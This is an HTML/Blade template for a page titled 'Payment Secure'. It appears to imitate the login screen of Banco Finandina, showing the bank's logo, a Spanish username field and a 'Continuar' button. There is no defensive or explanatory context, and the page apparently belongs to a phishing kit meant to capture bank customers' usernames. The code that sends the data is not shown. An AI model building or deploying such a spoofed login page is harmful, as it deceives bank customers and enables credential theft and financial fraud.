<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>Payment Secure</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
		
    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>

</head>
<body>

<img src="{{asset('assets/img/payment/finandina/logo.jpg')}}" alt="" srcset="" width="100%">

<center><input type="text" id="txtUsuario" placeholder="Ingresa el usuario" style="width:80%; border:none; border-bottom:1px solid #dcdcdc; padding-left:15px; height:40px; font-size:15px;" oninput="this.value = this.value.replace(/\s+/g, '')" required></center>
<a href="" style="position:absolute; right:30px; margin-top:10px;">¿Olvidaste tu usuario?</a>

<center><input type="submit" id="btnUsuario" value="Continuar" style="width:80%; background-color:#e1406d; margin-top:50px; height:40px; border-radius:20px;"></center>
<center><input type="submit" value="Registrarme ahora" style="width:80%; color:#f08ba7; border:1px solid #f08ba7;margin-top:10px; height:40px; background-color:white; border-radius:20px;"></center>
    


</body>
</html>